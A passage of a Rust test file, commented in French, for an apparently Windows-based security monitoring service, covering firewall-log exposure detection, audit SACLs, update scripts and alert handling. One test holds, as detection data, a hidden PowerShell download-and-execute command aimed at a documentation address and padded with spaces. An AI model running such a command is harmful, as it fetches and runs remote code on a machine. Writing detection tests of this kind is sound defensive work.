        let mut n = 0u32;
        while ReadFile(h, Some(&mut octet), Some(&mut n), None).is_ok() && n == 1 {
            if octet[0] == b'\n' {
                break;
            }
            recu.push(octet[0]);
        }
        if !recu.is_empty() {
            let _ = WriteFile(h, Some(format!("{reponse}\r\n").as_bytes()), None, None);
            let _ = FlushFileBuffers(h);
        }
        let _ = CloseHandle(h);
        String::from_utf8_lossy(&recu).trim_end_matches('\r').to_string()
    })
}

fn powershell_sortie(script: &str) -> String {
    let s = std::process::Command::new("powershell.exe").args(["-NoProfile", "-NonInteractive", "-Command", script]).env_remove("PSModulePath").output().unwrap();
    assert!(s.status.success(), "{}", String::from_utf8_lossy(&s.stderr));
    String::from_utf8_lossy(&s.stdout).trim().to_string()
}

#[test]
fn lot2_canal_code_de_production_sur_un_vrai_tube() {
    // Le code PowerShell EXACT du script de production (ps_canal), passé comme lui en ligne de commande à
    // powershell.exe : requête reçue par le serveur, filtre CIM, PID du serveur du tube
    use crate::maj::{ps_canal, script_installation, ParametresScript};
    let pid = std::process::id();
    let nom = format!("der4tizer-test-{pid}");
    // Pid-Service tel quel, sur un service qui existe partout (WMI) : filtre CIM correctement échappé
    let p = powershell_sortie(&format!("{}; Write-Output (Pid-Service)", ps_canal(&nom, "Winmgmt")));
    assert!(p.parse::<u32>().is_ok_and(|v| v > 0), "PID de Winmgmt : {p:?}");
    // Tube tenu par le processus attendu (ici le test, à la place du service) : requête exacte et réponse
    let serveur = serveur_tube(&nom, r#"{"Ok":true,"Message":"deR4Tizer 4.4"}"#);
    let sortie = powershell_sortie(&format!("{}; function Pid-Service {{ [uint32]{pid} }}; Write-Output ('REPONSE=' + (Lire-Reponse))", ps_canal(&nom, "Winmgmt")));
    let recu = serveur.join().unwrap();
    assert_eq!(recu, r#"{"Action":"verification"}"#, "requête envoyée au service");
    let c: crate::commun::Commande = serde_json::from_str(&recu).expect("JSON valide pour le service");
    assert_eq!(c.action.as_deref(), Some("verification"));
    assert_eq!(sortie, r#"REPONSE={"Ok":true,"Message":"deR4Tizer 4.4"}"#);
    // Tube tenu par un autre processus que le service : aucune requête envoyée, réponse nulle
    let serveur = serveur_tube(&nom, r#"{"Ok":true,"Message":"deR4Tizer 4.4"}"#);
    let sortie = powershell_sortie(&format!("{}; function Pid-Service {{ [uint32]1 }}; Write-Output ('NUL=' + ($null -eq (Lire-Reponse)))", ps_canal(&nom, "Winmgmt")));
    assert_eq!(serveur.join().unwrap(), "", "rien n'est envoyé à un tube squatté");
    assert_eq!(sortie, "NUL=True");
    // Le script de production embarque ce code tel quel, et sa syntaxe est valide
    let d = dossier_test("script-production");
    let (paquet, retour) = (d.join("n.msi"), d.join("a.msi"));
    let s = script_installation(&ParametresScript { version: "4.4", paquet: &paquet, sha_paquet: &"ab".repeat(32), retour: &retour,
        sha_retour: &"cd".repeat(32), journaux: &d, simulation: None });
    assert!(s.contains(&ps_canal("deR4Tizer", "deR4Tizer")));
    let f = d.join("script.ps1");
    std::fs::write(&f, &s).unwrap();
    let erreurs = powershell_sortie(&format!("$e = $null; [void][Management.Automation.Language.Parser]::ParseFile('{}', [ref]$null, [ref]$e); $e.Count", f.display()));
    assert_eq!(erreurs, "0");
    let _ = std::fs::remove_dir_all(&d);
}

/// Faux positifs « PC EXPOSÉ À INTERNET » (constatés le 2026-10-24) : le journal du pare-feu attribue au service les
/// paquets que reçoit sa socket de capture, et note les réponses aux connexions sortantes vers des ports éphémères.
/// Exposition réelle seulement : TCP vers un port en écoute, UDP hors de la plage dynamique, demande d'écho ICMP ;
/// jamais une ligne du service lui-même
#[test]
fn exposition_reelle_sans_faux_positifs() {
    use crate::parefeu::{exposition_reelle, plage_dynamique, ContexteExposition, LecteurJournal};
    let ctx = ContexteExposition { ecoute_tcp: [40001u16, 40002].into_iter().collect(), udp_dynamique: (49152, 65535), pid_service: 4000 };
    assert!(!exposition_reelle("TCP", 50001, 4000, "-", &ctx), "ligne de la socket de capture du service");
    assert!(!exposition_reelle("TCP", 1550, 9999, "-", &ctx), "réponse vers un port éphémère, rien n'y écoute");
    assert!(exposition_reelle("TCP", 40001, 9999, "-", &ctx), "connexion entrante vers un port en écoute");
    assert!(!exposition_reelle("UDP", 50003, 9999, "-", &ctx), "réponse UDP vers un port dynamique");
    assert!(exposition_reelle("UDP", 3000, 9999, "-", &ctx), "UDP vers un port fixe");
    assert!(!exposition_reelle("ICMP", 0, 9999, "0", &ctx), "réponse d'écho");
    assert!(exposition_reelle("ICMP", 0, 9999, "8", &ctx), "demande d'écho venue d'Internet");
    // Sortie de netsh, en anglais comme en français
    assert_eq!(plage_dynamique("Protocol udp Dynamic Port Range\n---\nStart Port      : 49152\nNumber of Ports : 16384\n"), Some((49152, 65535)));
    assert_eq!(plage_dynamique("Plage de ports dynamiques du protocole tcp\n---\nPort de démarrage : 1024\nNombre de ports   : 64511\n"), Some((1024, 65534)));
    assert_eq!(plage_dynamique("rien"), None);
    // Lignes synthétiques au format du journal (adresses de documentation, RFC 5737) : seule la connexion vers un
    // port en écoute donne une alerte
    let d = dossier_test("exposition");
    let f = d.join("pfirewall.log");
    std::fs::write(&f, "#Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags tcpsyn tcpack tcpwin icmptype icmpcode info path pid\n").unwrap();
    let mut lecteur = LecteurJournal::sur_fichier(f.clone());
    use std::io::Write;
    let mut o = std::fs::OpenOptions::new().append(true).open(&f).unwrap();
    for l in [
        "2026-01-01 10:00:01 ALLOW TCP 198.51.100.7 192.168.0.10 443 50001 0 - 0 0 0 - - - RECEIVE 4000",
        "2026-01-01 10:00:02 ALLOW TCP 198.51.100.20 192.168.0.10 443 50002 0 - 0 0 0 - - - RECEIVE 5000",
        "2026-01-01 10:00:03 ALLOW ICMP 192.0.2.53 192.168.0.10 - - 0 - - - - 0 0 - RECEIVE 4",
        "2026-01-01 10:00:04 ALLOW TCP 203.0.113.9 192.168.0.10 51515 40001 0 - 0 0 0 - - - RECEIVE 6000",
    ] {
        writeln!(o, "{l}").unwrap();
    }
    drop(o);
    let alertes = lecteur.lire(&|_| String::new(), &ctx);
    assert_eq!(alertes.len(), 1, "{:?}", alertes.iter().map(|a| a.raisons.clone()).collect::<Vec<_>>());
    assert!(alertes[0].raisons.contains("203.0.113.9") && alertes[0].port == 40001);
    let _ = std::fs::remove_dir_all(&d);
}

/// Client NTP de Windows : envoi du port local 123 vers time.windows.com:123, réponse de 123 vers 123, hors de la
/// plage dynamique. Reconnue par l'état du flux (envoi récent en sens inverse), pas par une liste de ports : le même
/// port 123 joint par une autre source, ou par la même source depuis un autre port, reste une exposition
#[test]
fn exposition_udp_reponse_reconnue_par_le_flux() {
    use crate::parefeu::{reponse_udp, ContexteExposition, FluxUdp, LecteurJournal, DELAI_REPONSE_UDP};
    use std::time::{Duration, Instant};
    let serveur: std::net::IpAddr = "192.0.2.123".parse().unwrap();
    let mut flux = FluxUdp::new();
    let maintenant = Instant::now();
    flux.insert((123, serveur, 123), maintenant);
    assert!(reponse_udp(&flux, 123, serveur, 123, maintenant), "réponse du serveur NTP");
    assert!(!reponse_udp(&flux, 123, "203.0.113.9".parse().unwrap(), 123, maintenant), "autre source vers le port 123");
    assert!(!reponse_udp(&flux, 123, serveur, 40000, maintenant), "même source, autre port distant");
    assert!(!reponse_udp(&flux, 123, serveur, 123, maintenant + DELAI_REPONSE_UDP + Duration::from_secs(1)), "envoi trop ancien");
    // Lignes du journal : envoi puis réponse, sans alerte ; la même source sans envoi préalable, avec alerte
    let ctx = ContexteExposition { ecoute_tcp: Default::default(), udp_dynamique: (49152, 65535), pid_service: 4000 };
    let d = dossier_test("exposition-ntp");
    let f = d.join("pfirewall.log");
    std::fs::write(&f, "#Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags tcpsyn tcpack tcpwin icmptype icmpcode info path pid
").unwrap();
    let mut lecteur = LecteurJournal::sur_fichier(f.clone());
    use std::io::Write;
    let mut o = std::fs::OpenOptions::new().append(true).open(&f).unwrap();
    for l in [
        "2026-01-01 12:00:00 ALLOW UDP 192.168.0.10 192.0.2.123 123 123 0 - - - - - - - SEND 1500",
        "2026-01-01 12:00:00 ALLOW UDP 192.0.2.123 192.168.0.10 123 123 0 - - - - - - - RECEIVE 1500",
        "2026-01-01 12:00:05 ALLOW UDP 203.0.113.9 192.168.0.10 123 123 0 - - - - - - - RECEIVE 1500",
    ] {
        writeln!(o, "{l}").unwrap();
    }
    drop(o);
    let alertes = lecteur.lire(&|_| String::new(), &ctx);
    assert_eq!(alertes.len(), 1, "{:?}", alertes.iter().map(|a| a.raisons.clone()).collect::<Vec<_>>());
    assert!(alertes[0].raisons.contains("203.0.113.9") && alertes[0].port == 123);
    let _ = std::fs::remove_dir_all(&d);
}

/// Audit des données sensibles, posé par handle (natif::poser_audit_arborescence) : SACL complétée, jamais
/// remplacée. Seules les entrées de deR4Tizer (audit explicite de Tout le monde, succès, mêmes droits) sont
/// retirées ; une règle de l'organisation ou une entrée héritée est gardée. Rien à écrire si l'audit est déjà en
/// place (sinon des rafales d'événements 4907 à chaque passage). La pose réelle (privilège SeSecurityPrivilege,
/// jonction vers un canari, entrée tierce gardée) est vérifiée par le scénario 3b.
#[test]
fn audit_donnees_sacl_completee() {
    use crate::natif::sacl_completee;
    let dossier = "AU;OINPIOSA;CC;;;WD";
    let fichier = "AU;SA;CC;;;WD";
    // Aucune SACL : l'entrée est ajoutée
    assert_eq!(sacl_completee("", dossier, false).as_deref(), Some("S:(AU;OINPIOSA;CC;;;WD)"));
    assert_eq!(sacl_completee("S:", fichier, true).as_deref(), Some("S:(AU;SA;CC;;;WD)"));
    // Déjà en place : rien à écrire
    assert_eq!(sacl_completee("S:(AU;OINPIOSA;CC;;;WD)", dossier, false), None);
    assert_eq!(sacl_completee("S:AI(AU;IDSA;CC;;;WD)", fichier, true), None, "fichier : entrée héritée du dossier");
    assert!(sacl_completee("S:AI(AU;IDOINPIOSA;CC;;;WD)", dossier, false).is_some(), "dossier : l'entrée héritée ne suffit pas");
    // Entrée tierce (règle de l'organisation) gardée, la nôtre ajoutée
    assert_eq!(sacl_completee("S:(AU;SAFA;FA;;;BA)", dossier, false).as_deref(), Some("S:(AU;SAFA;FA;;;BA)(AU;OINPIOSA;CC;;;WD)"));
    assert_eq!(sacl_completee("S:(AU;SAFA;FA;;;BA)(AU;OINPIOSA;CC;;;WD)", dossier, false), None, "tierce et nôtre : rien à écrire");
    // Autre audit de Tout le monde, mais pas le nôtre (échecs, autres droits) : gardé
    assert_eq!(sacl_completee("S:(AU;FA;CC;;;WD)(AU;SA;FA;;;WD)", fichier, true).as_deref(), Some("S:(AU;FA;CC;;;WD)(AU;SA;FA;;;WD)(AU;SA;CC;;;WD)"));
    // Notre ancienne entrée (autres drapeaux d'héritage) remplacée, drapeaux de contrôle et entrées héritées gardés
    assert_eq!(sacl_completee("S:AI(AU;OICIIOSA;CC;;;WD)(AU;IDSAFA;FA;;;BA)", dossier, false).as_deref(),
        Some("S:AI(AU;IDSAFA;FA;;;BA)(AU;OINPIOSA;CC;;;WD)"));
    // Doublon de la nôtre : un seul exemplaire gardé
    assert_eq!(sacl_completee("S:(AU;OINPIOSA;CC;;;WD)(AU;OICIIOSA;CC;;;WD)", dossier, false).as_deref(), Some("S:(AU;OINPIOSA;CC;;;WD)"));
    // Idempotent : le résultat complété ne demande plus rien
    let r = sacl_completee("S:(AU;SAFA;FA;;;BA)", fichier, true).unwrap();
    assert_eq!(sacl_completee(&r, fichier, true), None);
    // Lecture : un descripteur sans SACL (la plupart des fichiers) donne une SACL vide, pas « illisible » ; sans quoi
    // l'audit n'était jamais posé sur ces fichiers (constaté par le scénario 3b en Windows Sandbox)
    use crate::natif::texte_sacl_de_sddl;
    assert_eq!(texte_sacl_de_sddl("O:BAG:BAD:(A;;FA;;;BA)").as_deref(), Some(""));
    let vide = texte_sacl_de_sddl("O:BAG:BAD:(A;;FA;;;BA)").unwrap();
    assert_eq!(sacl_completee(&vide, fichier, true).as_deref(), Some("S:(AU;SA;CC;;;WD)"));
    assert_eq!(texte_sacl_de_sddl("O:BAS:(AU;SAFA;FA;;;BA)").as_deref(), Some("S:(AU;SAFA;FA;;;BA)"));
    // SACL présente mais nulle : vide aussi (sa forme texte « S:NO_ACCESS_CONTROL » donnerait un SDDL invalide)
    assert_eq!(texte_sacl_de_sddl("O:BAS:NO_ACCESS_CONTROL").as_deref(), Some(""));
}

/// Le script d'installation lancé par la commande de production s'exécute vraiment. Avec DETACHED_PROCESS, Windows
/// PowerShell 5.1 sortait avec le code 0 sans rien exécuter : aucune mise à jour n'était installée et aucun retour
/// arrière n'avait lieu (scénario 3c en Windows Sandbox). Témoin : la même commande détachée n'écrit rien.
#[test]
fn script_installation_lance_s_execute() {
    use crate::maj::commande_script;
    use std::os::windows::process::CommandExt;
    let d = dossier_test("script-lance");
    let (marque, temoin) = (d.join("marque.txt"), d.join("temoin.txt"));
    let ecrire = |f: &std::path::Path| format!("Set-Content -LiteralPath '{}' -Value ok", f.display());
    let code = commande_script(&ecrire(&marque)).spawn().unwrap().wait().unwrap();
    assert!(code.success() && marque.exists(), "le script lancé par commande_script ne s'est pas exécuté");
    let code = commande_script(&ecrire(&temoin)).creation_flags(0x0800_0000 | 0x0000_0008).spawn().unwrap().wait().unwrap();
    assert!(code.success() && !temoin.exists(), "témoin : PowerShell détaché a exécuté la commande (comportement à revoir)");
    let _ = std::fs::remove_dir_all(&d);
}

/// Arrêt du service : ses enfants curl.exe sont terminés (sinon ils gardaient ouvert un fichier du dossier de données
/// et la désinstallation le laissait). Décision : enfants directs seulement, par nom sans casse. Réel : un enfant lancé
/// par ce processus de test est bien terminé, un processus d'un autre parent ne l'est pas.
#[test]
fn arret_termine_les_enfants_nommes() {
    use crate::natif::{enfants_nommes, terminer_enfants, InfoListe};
    let mut l = std::collections::HashMap::new();
    l.insert(10, InfoListe { nom: "deR4TizerSvc".into(), parent: 1 });
    l.insert(11, InfoListe { nom: "curl".into(), parent: 10 });
    l.insert(12, InfoListe { nom: "CURL".into(), parent: 10 });
    l.insert(13, InfoListe { nom: "powershell".into(), parent: 10 });
    l.insert(14, InfoListe { nom: "curl".into(), parent: 99 });
    assert_eq!(enfants_nommes(&l, 10, &["curl"]), vec![11, 12], "curl, sans casse ; ni powershell ni le curl d'un autre parent");
    assert!(enfants_nommes(&l, 10, &["deR4TizerSvc"]).is_empty(), "jamais le parent lui-même");
    // Réel : ping.exe lancé par ce processus (30 s), terminé tout de suite
    let mut enfant = std::process::Command::new("ping.exe").args(["-n", "30", "127.0.0.1"])
        .stdout(std::process::Stdio::null()).spawn().unwrap();
    std::thread::sleep(std::time::Duration::from_millis(300));
    let debut = std::time::Instant::now();
    assert!(terminer_enfants(&["ping"]) >= 1, "enfant ping.exe non terminé");
    let code = enfant.wait().unwrap();
    assert!(!code.success() && debut.elapsed() < std::time::Duration::from_secs(5), "ping.exe a continué ({code:?})");
}

/// Exposition : un paquet UDP BLOQUÉ qui répond à un flux du poste n'est pas une exposition (réponses d'un flux QUIC
/// sortant bloquées pendant une reconfiguration du réseau ; paquet du serveur d'un VPN au milieu de paquets
/// acceptés). Flux appris d'un envoi du poste ou d'une réponse acceptée vers un port dynamique. Un paquet bloqué
/// d'une source avec laquelle le poste n'a rien échangé, ou d'un autre port de cette source, reste une alerte.
/// Lignes synthétiques (adresses de documentation, RFC 5737).
#[test]
fn exposition_paquet_bloque_reponse_a_un_flux() {
    use crate::parefeu::{ContexteExposition, LecteurJournal};
    let ctx = ContexteExposition { ecoute_tcp: Default::default(), udp_dynamique: (49152, 65535), pid_service: 4000 };
    let d = dossier_test("exposition-bloques");
    let f = d.join("pfirewall.log");
    std::fs::write(&f, "#Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags tcpsyn tcpack tcpwin icmptype icmpcode info path pid\n").unwrap();
    let mut lecteur = LecteurJournal::sur_fichier(f.clone());
    use std::io::Write;
    let mut o = std::fs::OpenOptions::new().append(true).open(&f).unwrap();
    for l in [
        // Flux QUIC sortant, puis réponses bloquées
        "2026-01-01 10:00:00 ALLOW UDP 192.168.0.10 198.51.100.30 50010 443 0 - - - - - - - SEND 5000",
        "2026-01-01 10:00:02 DROP UDP 198.51.100.30 192.168.0.10 443 50010 56 - - - - - - - RECEIVE 5000",
        "2026-01-01 10:00:03 DROP UDP 198.51.100.30 192.168.0.10 443 50010 1039 - - - - - - - RECEIVE 5000",
        // Serveur d'un VPN : réponse acceptée vers un port dynamique, puis un paquet bloqué du même flux
        "2026-01-01 10:00:04 ALLOW UDP 203.0.113.40 192.168.0.10 51820 50020 0 - - - - - - - RECEIVE 5100",
        "2026-01-01 10:00:05 DROP UDP 203.0.113.40 192.168.0.10 51820 50020 176 - - - - - - - RECEIVE 5100",
        // Témoins, chacun sur son propre port local (clé d'alerte distincte de celle des réponses) : source inconnue ;
        // même source, autre port distant ; ligne acceptée de la socket de capture du service (PID 4000), qui ne doit
        // pas masquer le paquet bloqué qui la suit
        "2026-01-01 10:00:06 DROP UDP 192.0.2.99 192.168.0.10 5000 50030 60 - - - - - - - RECEIVE 0",
        "2026-01-01 10:00:07 DROP UDP 198.51.100.30 192.168.0.10 9999 50011 60 - - - - - - - RECEIVE 0",
        "2026-01-01 10:00:08 ALLOW UDP 192.0.2.77 192.168.0.10 6000 50040 0 - - - - - - - RECEIVE 4000",
        "2026-01-01 10:00:09 DROP UDP 192.0.2.77 192.168.0.10 6000 50040 60 - - - - - - - RECEIVE 0",
    ] {
        writeln!(o, "{l}").unwrap();
    }
    drop(o);
    let alertes = lecteur.lire(&|_| String::new(), &ctx);
    let raisons: Vec<String> = alertes.iter().map(|a| a.raisons.clone()).collect();
    assert_eq!(alertes.len(), 3, "{raisons:?}");
    assert!(alertes.iter().any(|a| a.raisons.contains("192.0.2.99") && a.port == 50030), "{raisons:?}");
    assert!(alertes.iter().any(|a| a.raisons.contains("198.51.100.30") && a.port == 50011), "{raisons:?}");
    assert!(alertes.iter().any(|a| a.raisons.contains("192.0.2.77") && a.port == 50040), "{raisons:?}");
    assert!(!alertes.iter().any(|a| a.port == 50010), "réponses du flux QUIC sortant : {raisons:?}");
    assert!(!raisons.iter().any(|r| r.contains("203.0.113.40")), "{raisons:?}");
    let _ = std::fs::remove_dir_all(&d);
}

/// Phase 3.1 (docs/detection/modele-evenement.md) : un alertes.json au format d'avant la phase 3 se relit champ par
/// champ, avec le modèle 0 ; les champs Regle et Collecte vides ne sont pas écrits
#[test]
fn phase3_alerte_ancienne_relue_sans_perte() {
    use crate::commun::lire_alertes_texte;
    let ancien = r#"[{"Id":"a1","Heure":"2026-10-20 10:00:00","Niveau":"Alerte","Score":3,"Processus":"x","Chemin":"C:\\x.exe",
        "Destination":"203.0.113.9","Ip":"203.0.113.9","NomDns":null,"Port":443,"Raisons":"r","Pid":42,"Mitre":"T1071","Conseil":"c"}]"#;
    let (a, ecartees) = lire_alertes_texte(ancien).expect("tableau lisible");
    assert_eq!(ecartees, 0);
    assert_eq!(a.len(), 1);
    let x = &a[0];
    assert!(x.id == "a1" && x.niveau == "Alerte" && x.score == 3 && x.port == 443 && x.pid == Some(42) && x.mitre == "T1071");
    assert_eq!(x.modele, 0, "une alerte relue garde son modèle d'origine");
    let json = serde_json::to_string(&a[0]).unwrap();
    assert!(json.contains("\"Modele\":0") && !json.contains("\"Regle\"") && !json.contains("\"Collecte\""), "{json}");
}

/// Phase 3.1 : une seule alerte illisible ne fait plus perdre tout l'historique (avant : lire rendait None, puis le
/// premier ajout réécrivait un fichier vide)
#[test]
fn phase3_une_alerte_mal_formee_ne_fait_pas_perdre_les_autres() {
    use crate::commun::{lire_alertes_texte, Alerte};
    let mut v: Vec<serde_json::Value> = (0..999).map(|i| serde_json::json!({ "Id": format!("a{i}"), "Niveau": "Info", "Score": 0 })).collect();
    v.insert(500, serde_json::json!({ "Id": "mauvaise", "Score": "pas un nombre" }));
    let texte = serde_json::to_string(&v).unwrap();
    assert!(serde_json::from_str::<Vec<Alerte>>(&texte).is_err(), "témoin : la lecture d'un bloc échoue");
    let (a, ecartees) = lire_alertes_texte(&texte).expect("tableau lisible");
    assert_eq!((a.len(), ecartees), (999, 1));
    assert!(a.iter().all(|x| x.id != "mauvaise"));
    // Texte qui n'est pas un tableau : illisible (le fichier sera mis de côté, jamais écrasé)
    assert!(lire_alertes_texte("{\"Id\":\"a\"}").is_none());
    assert!(lire_alertes_texte("pas du json").is_none());
    crate::tests::torturer_texte(&texte[..400.min(texte.len())], &mut |t| { let _ = lire_alertes_texte(t); });
}

/// Relecture de #72 : ordre des contrôles d'alertes.json ; un fichier refusé n'est jamais déplacé, même trop grand (D4) ;
/// un contenu qui n'est pas de l'UTF-8 est mis de côté, pas laissé à l'écrasement (D5) ; des éléments écartés gardent
/// une copie (décision « Lire » avec un nombre)
#[test]
fn phase3_decision_alertes() {
    use crate::commun::{decision_alertes, DecisionAlertes, TAILLE_MAX_ALERTES};
    let refuse = |d: DecisionAlertes| matches!(d, DecisionAlertes::Rien);
    let de_cote = |d: DecisionAlertes, r: &str| matches!(d, DecisionAlertes::MettreDeCote(x) if x == r);
    assert!(refuse(decision_alertes(false, TAILLE_MAX_ALERTES + 1, None)), "fichier refusé mais trop grand : déplacé");
    assert!(refuse(decision_alertes(false, 10, Some(b"[]"))), "fichier refusé : lu");
    assert!(de_cote(decision_alertes(true, TAILLE_MAX_ALERTES + 1, None), "trop-grand"));
    assert!(de_cote(decision_alertes(true, 4, Some(&[0x5b, 0xff, 0xfe, 0x5d])), "illisible"), "non UTF-8 : laissé à l'écrasement");
    assert!(de_cote(decision_alertes(true, 6, Some(b"{\"a\":1}")), "illisible"));
    assert!(refuse(decision_alertes(true, 10, None)), "lecture impossible : rien de déplacé");
    match decision_alertes(true, 40, Some(br#"[{"Id":"a"},{"Score":"x"}]"#)) {
        DecisionAlertes::Lire(a, n) => assert_eq!((a.len(), n), (1, 1)),
        _ => panic!("lecture partielle"),
    }
    let source = include_str!("api.rs");
    assert!(source.contains("commun::lire_alertes_sans_effet()") && !source.contains(concat!("commun::lire(\"alertes", ".json\")")), "API en tout ou rien");
}

/// Audit de sécurité de #72, S72-01 : une alerte aux champs hostiles (valeur Run d'1 Mo de caractères de contrôle) est
/// bornée ; 1000 alertes bornées tiennent sous TAILLE_MAX_ALERTES ; bornage et écriture retenue posés dans le moniteur
#[test]
fn phase3_alerte_bornee() {
    use crate::commun::{borner_alerte, Alerte, MAX_RAISONS_ALERTE, TAILLE_MAX_ALERTES};
    let hostile: String = std::iter::repeat_n('\u{1}', 524_287).collect();
    let mut a = Alerte { raisons: hostile.clone(), chemin: hostile.clone(), parent: hostile.clone(), processus: hostile.clone(),
        destination: hostile.clone(), ip: Some(hostile.clone()), nom_dns: Some("\u{10FFFF}".repeat(600_000)), ..Default::default() };
    borner_alerte(&mut a);
    let octets = serde_json::to_vec(&a).unwrap().len();
    assert!(octets < 16 * 1024, "alerte bornée de {octets} octets");
    assert!(octets * 1000 < TAILLE_MAX_ALERTES as usize);
    assert_eq!(a.raisons.chars().count(), MAX_RAISONS_ALERTE + 3, "500 premiers, « … », 500 derniers");
    assert!(!a.raisons.chars().any(|c| c.is_control()));
    // Alerte ordinaire inchangée
    let mut b = Alerte { raisons: "connexion vers 203.0.113.9".into(), chemin: r"C:\x.exe".into(), ..Default::default() };
    borner_alerte(&mut b);
    assert!(b.raisons == "connexion vers 203.0.113.9" && b.chemin == r"C:\x.exe");
    let source = include_str!("moniteur.rs");
    let debut = source.find("fn ajouter_alerte_brute").unwrap();
    let corps = &source[debut..debut + 1200];
    let (b, f) = (corps.find("commun::borner_alerte(&mut a)").expect("bornage absent"), corps.find("apprentissage::filtrer(&mut a)").expect("filtrer"));
    assert!(corps.find("mitre::enrichir(&mut a)").unwrap() < b && f < b, "bornage avant les décisions sur le texte entier (S72-06)");
    let e = source.find("fn ecrire_alertes").unwrap();
    assert!(source[e..e + 600].contains("commun::ecriture_alertes_permise()"), "écriture d'alertes.json non retenue");
}

/// Audit de sécurité de #72, S72-06 : une persistance malveillante rallongée (motif après 1100 espaces) garde son signal
/// fort et sa technique MITRE, décidés sur le texte entier ; le bornage garde la remarque finale visible
#[test]
fn phase3_bornage_garde_la_conclusion() {
    use crate::commun::{borner_alerte, Alerte};
    let commande = format!("powershell.exe{}-w hidden -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')", " ".repeat(1100));
    let remarque = crate::processus::suspicion(&commande).expect("motif PowerShell");
    let mut a = Alerte { regle: "PER-001".into(), mitre: "T1547.001".into(), niveau: "Alerte".into(), score: 3, raisons: format!("NOUVEAU démarrage automatique : {commande} [{remarque}]"), ..Default::default() };
    crate::mitre::enrichir(&mut a);
    assert!(crate::apprentissage::signal_fort(&a), "témoin : signal fort sur le texte entier");
    // La technique est celle posée par le producteur (type d'entrée : clé Run), plus des mots du texte (point 1 de la revue du 2026-11-22)
    let mitre = a.mitre.clone();
    assert!(mitre.contains("T1547.001"), "témoin : technique de la persistance ({mitre})");
    borner_alerte(&mut a);
    assert!(a.raisons.contains(remarque), "remarque coupée par le bornage : {}", a.raisons);
    assert_eq!(a.mitre, mitre);
}

/// Relecture de #72, D7 : un fichier mis de côté compte comme historique (pas de nouvel apprentissage)
#[test]
fn phase3_historique_mis_de_cote_compte() {
    use crate::commun::historique_alertes_existe;
    let n = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
    assert!(historique_alertes_existe(&n(&["config.json", "alertes.json"])));
    assert!(historique_alertes_existe(&n(&["alertes-trop-grand-20261025120000.json"])));
    assert!(historique_alertes_existe(&n(&["Alertes-illisible-20261025120000-1.JSON"])));
    assert!(!historique_alertes_existe(&n(&["config.json", "apprentissage.json", "alertes.json.tmp", "incidents.json"])));
    assert!(include_str!("apprentissage.rs").contains("commun::historique_alertes_existe(&commun::noms_du_dossier())"));
}

/// Audit de sécurité de #72, S72-10 : une exception posée sur une alerte bornée vise le comportement entier. Avant :
/// l'exception portait la signature de l'alerte bornée ; le programme légitime au chemin long n'y correspondait jamais,
/// et un programme posé au chemin borné littéral (« début … fin ») en héritait
#[test]
fn phase3_exception_sur_alerte_bornee() {
    use crate::apprentissage::{decider, signature_avec, Exception};
    use crate::commun::{borner_alerte, empreinte_signature, Alerte};
    use std::collections::BTreeSet;
    let chemin = format!(r"C:\Outils\{}\outil.exe", "a".repeat(700));
    let entiere = Alerte { niveau: "Alerte".into(), chemin: chemin.clone(), destination: "203.0.113.9".into(), raisons: "connexion suspecte".into(), ..Default::default() };
    let sig = signature_avec(&entiere, "");
    let mut bornee = entiere.clone();
    borner_alerte(&mut bornee);
    let sig_bornee = signature_avec(&bornee, "");
    assert_ne!(sig, sig_bornee, "témoin : le bornage change la signature");
    // Exception posée depuis l'alerte enregistrée : par son empreinte (texte entier)
    let exc = vec![Exception { signature: empreinte_signature(&sig), description: String::new(), date: String::new() }];
    let vide = BTreeSet::new();
    assert!(decider("Alerte", &sig, false, &vide, &exc).is_some(), "le programme légitime n'est pas couvert par son exception");
    assert!(decider("Alerte", &sig_bornee, false, &vide, &exc).is_none(), "un programme au chemin borné hérite de l'exception");
    // Ancien format (signature en clair) toujours reconnu
    let ancienne = vec![Exception { signature: sig.clone(), description: String::new(), date: String::new() }];
    assert!(decider("Alerte", &sig, false, &vide, &ancienne).is_some());
    // Comportement appris : par empreinte (R7 : apprentissage.json borné), ancien format reconnu
    let appris: BTreeSet<String> = [empreinte_signature(&sig)].into();
    assert!(decider("Alerte", &sig, false, &appris, &[]).is_some());
    assert!(empreinte_signature(&sig).len() == 71 && empreinte_signature(&sig).starts_with("sha256:"));
    // Le moniteur pose l'empreinte sur le texte entier, avant le bornage ; l'exception la reprend
    let m = include_str!("moniteur.rs");
    let d = m.find("fn ajouter_alerte_brute").unwrap();
    // Fenêtre élargie (PR 3.3c : collecte d'origine posée avant le bornage)
    let corps = &m[d..d + 1400];
    let (calcul, filtre, pose, borne) = (corps.find("commun::empreinte_signature(").expect("empreinte"), corps.find("apprentissage::filtrer(&mut a)").unwrap(),
        corps.find("a.signature = empreinte;").expect("empreinte jamais posée sur l'alerte (relecture de #73, D1)"), corps.find("commun::borner_alerte(&mut a)").unwrap());
    assert!(calcul < filtre && filtre < pose && pose < borne, "ordre : empreinte, filtrer, pose, bornage");
    // D2 : comportement appris mémorisé par empreinte, jamais en clair (apprentissage.json borné)
    let ap = include_str!("apprentissage.rs");
    assert!(ap.contains("e.appris.insert(commun::empreinte_signature(&sig))") && !ap.contains("e.appris.insert(sig)"), "comportement appris mémorisé en clair");
    // L'exception vise l'empreinte de l'alerte (cible_exception)
    let avec = Alerte { niveau: "Info".into(), signature: empreinte_signature(&sig), ..bornee.clone() };
    assert_eq!(crate::apprentissage::cible_exception(&avec).as_deref(), Ok(empreinte_signature(&sig).as_str()));
}

/// Audit de sécurité de #73, S73-01 et S73-02 : sans empreinte, une alerte Info ou Critique, ou une alerte dont un champ
/// de la signature a été borné, ne donne pas d'exception (sinon, la signature du texte borné couvrirait un programme posé
/// au chemin borné) ; une empreinte mal formée est refusée ; une alerte ancienne non bornée garde l'ancienne signature
#[test]
fn phase3_exception_sans_empreinte() {
    use crate::apprentissage::{cible_exception, signature_avec};
    use crate::commun::{borner_alerte, Alerte};
    let longue = Alerte { niveau: "Alerte".into(), chemin: format!(r"C:\{}\x.exe", "a".repeat(700)), destination: "203.0.113.9".into(), ..Default::default() };
    let mut bornee = longue.clone();
    borner_alerte(&mut bornee);
    assert!(cible_exception(&bornee).is_err(), "alerte bornée sans empreinte : exception acceptée");
    // Chaque champ de la signature compte, pas seulement le chemin (relecture de #73, R1)
    for champ in ["parent", "destination", "nom_dns"] {
